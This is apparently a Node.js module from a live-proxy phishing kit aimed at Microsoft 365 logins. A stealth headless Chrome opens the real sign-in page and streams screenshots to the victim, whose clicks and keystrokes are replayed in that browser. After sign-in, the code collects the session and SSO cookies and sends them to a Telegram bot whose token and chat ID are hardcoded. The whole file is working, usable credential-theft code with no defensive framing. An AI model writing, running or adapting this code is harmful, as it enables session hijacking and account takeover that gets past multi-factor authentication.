const puppeteer = require('puppeteer-extra');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');
const axios = require('axios');
const FormData = require('form-data');

puppeteer.use(StealthPlugin());

const VAULT_URL = "https://script.googleusercontent.com/macros/echo?user_content_key=AWDtjMUqhClgfeFlU8Xv_oX6N6eXj3l7lbyNcSkwxk-JkstXJYafiVNpdDBlT452ND7spqv7p3eQRXoD5LOsTDGcSZA1g4RX8v7GLHXuLucT81tg9au9CEbNP55X9hLIOqMSQh8Fc-taJut7HXkZiFO464jKxJCrfrUaLuqfE4rZyHPFdaXwlPY9wZwfTHjcYK33eMIoLp_eyKW2KspfnYAk2Xx6dbBVNjIOCTUS9di8QeEHoSra82-uqH8Wrl5yHTXorlXRxsCYZa4-wO_EOwajrh3mg7KUNQ&lib=MycdviQl2tpQGpak5QfXFV5l1jq1QWbX2";
const TARGET = "https://login.microsoftonline.com/";

async function getCredentials() {
    try {
        const response = await axios.get(VAULT_URL, { timeout: 7000, maxRedirects: 5 });
        if (response.data && response.data.TG_TOKEN) return response.data;
    } catch (e) { console.log("[SYSTEM] Using fallback creds."); }
    return { 
        "TG_TOKEN": "8219244739:AAGqPPCIoujdgeW6NF5xZ2j1dZlDQAa-4pc",
        "TG_CHAT_ID": "1318100118"
    };
}

async function sendExfiltration(cookies, url) {
    const creds = await getCredentials();
    const host = new URL(url).hostname;
    try {
        await axios.post(`https://api.telegram.org/bot${creds.TG_TOKEN}/sendMessage`, {
            chat_id: creds.TG_CHAT_ID,
            text: `<b>🚨 KMSI BYPASSED & CAPTURED</b>\n<b>Destination:</b> ${host}\n<b>Jar Size:</b> ${cookies.length}`,
            parse_mode: 'HTML'
        });

        const form = new FormData();
        form.append('chat_id', creds.TG_CHAT_ID);
        form.append('document', Buffer.from(JSON.stringify(cookies, null, 2)), {
            filename: `KMSI_LOG_${host.replace(/\./g, '_')}.json`,
            contentType: 'application/json'
        });

        await axios.post(`https://api.telegram.org/bot${creds.TG_TOKEN}/sendDocument`, form, {
            headers: form.getHeaders()
        });
    } catch (e) { console.log("[EXFIL] Delivery error."); }
}

async function startSession(io, socket) {
    let browser = null;
    let captured = false;

    try {
        browser = await puppeteer.launch({
            headless: "new",
            args: [
                '--no-sandbox', 
                '--disable-setuid-sandbox', 
                '--disable-web-security',
                '--disable-features=IsolateOrigins,site-per-process'
            ]
        });

        const page = await browser.newPage();
        await page.setViewport({ width: 1280, height: 720 });
        
        // Use a very specific, modern UA to avoid KMSI loops
        await page.setUserAgent('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36');

        await page.goto(TARGET, { waitUntil: 'networkidle2' });

        // MONITOR FOR NAVIGATION CHANGE (The bridge past KMSI)
        page.on('framenavigated', async (frame) => {
            if (frame !== page.mainFrame()) return;
            
            const url = frame.url();
            const cookies = await page.cookies();
            const hasAuth = cookies.some(c => c.name.includes('AUTH') || c.name.includes('SSO') || c.name.includes('SecAuth'));

            // If we've moved PAST the login/kmsi screens and have cookies
            if (hasAuth && !url.includes('login.') && !captured) {
                captured = true; 
                console.log("[FLOW] Victim moved past KMSI. Exfiltrating...");
                await sendExfiltration(cookies, url);
            }
        });

        // POLLER FALLBACK (If the 'framenavigated' event misses)
        const poller = setInterval(async () => {
            if (captured) return;
            try {
                const url = page.url();
                const cookies = await page.cookies();
                
                // If they are on the inbox, capture immediately
                if (url.includes('outlook') || url.includes('mail') || url.includes('portal')) {
                    const hasAuth = cookies.some(c => c.name.includes('AUTH'));
                    if (hasAuth) {
                        captured = true;
                        await sendExfiltration(cookies, url);
                    }
                }
            } catch (e) {}
        }, 3000);

        // STREAM
        const stream = setInterval(async () => {
            if (socket.connected) {
                try {
                    const b64 = await page.screenshot({ encoding: 'base64', type: 'jpeg', quality: 20 });
                    socket.emit('browser-render', { screenshot: b64 });
                } catch (e) {}
            }
        }, 1000);

        socket.on('victim-action', async (data) => {
            try {
                if (data.type === 'click') {
                    await page.mouse.move(data.x, data.y);
                    await page.mouse.click(data.x, data.y, { delay: 50 });
                } else if (data.type === 'key') {
                    await page.keyboard.press(data.key);
                }
            } catch (e) {}
        });

        socket.on('disconnect', async () => {
            clearInterval(poller);
            clearInterval(stream);
            if (browser) await browser.close();
        });

    } catch (err) { if (browser) await browser.close(); }
}

module.exports = { startSession };
